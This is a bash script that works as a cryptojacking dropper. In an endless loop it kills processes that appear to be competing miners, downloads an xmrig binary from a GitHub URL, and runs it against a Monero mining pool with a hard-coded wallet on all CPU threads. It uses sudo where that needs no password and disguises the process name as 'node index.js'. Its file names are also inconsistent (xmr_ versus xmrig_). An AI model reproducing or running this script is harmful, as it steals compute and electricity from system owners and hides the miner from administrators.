#!/bin/bash

architecture=$(uname -m)
thread=$(nproc)

case $architecture in
    arm64 | aarch64)
        arch="arm64"
        ;;
    x86_64 | amd64)
        arch="amd64"
        ;;
    *)
        echo "Unsupported architecture: $architecture"
        exit 1
        ;;
esac
#chmod +x prepare.bin
#./prepare.bin

unalias -a

while true; do
    pkill -f lol
    pkill -f noob
    pkill -f "./start"
    pkill -f apachelogs
    pkill -f a.sh
    pkill -f syst3md
    pkill -9 start

    rm -f xmr_$arch
    if command -v curl >/dev/null 2>&1; then
        curl -LO https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
    elif command -v wget >/dev/null 2>&1; then
        wget https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
    else
        curl -LO https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
        wget https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
    fi


    chmod +x xmr_$arch
    if sudo -n true 2>/dev/null; then
        sudo -n bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
    else
        bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
    fi

    echo "waiting 30s"
    sleep 30
done
